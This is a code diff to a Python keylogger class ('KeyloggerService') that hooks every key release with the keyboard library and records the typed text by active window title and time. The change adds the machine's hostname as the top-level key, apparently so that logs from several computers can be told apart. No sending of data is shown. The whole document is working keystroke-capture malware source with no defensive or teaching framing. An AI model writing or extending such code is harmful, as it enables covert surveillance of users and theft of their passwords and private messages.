@@ -2,11 +2,13 @@ import keyboard
 from datetime import datetime
 import pygetwindow as pw
 import time
+import socket
 
 class KeyloggerService:
 
     def __init__(self):
-        self.data = {}
+        self.source_computer = socket.gethostname()
+        self.data = {self.source_computer : {} }
         self.getKeyWord()
         #self.getData()
 
@@ -17,12 +19,12 @@ class KeyloggerService:
             current_time = self.getTime(event)
             activeWindow = self.getWindowName()
 
-            if activeWindow not in self.data:
-                self.data[activeWindow] = {}
-            if current_time not in self.data[activeWindow]:
-                self.data[activeWindow][current_time] = ""
+            if activeWindow not in self.data[self.source_computer]:
+                self.data[self.source_computer][activeWindow] = {}
+            if current_time not in self.data[self.source_computer][activeWindow]:
+                self.data[self.source_computer][activeWindow][current_time] = ""
 
-            self.data[activeWindow][current_time] += event_name
+            self.data[self.source_computer][activeWindow][current_time] += event_name
 
         keyboard.on_release(callback)
 
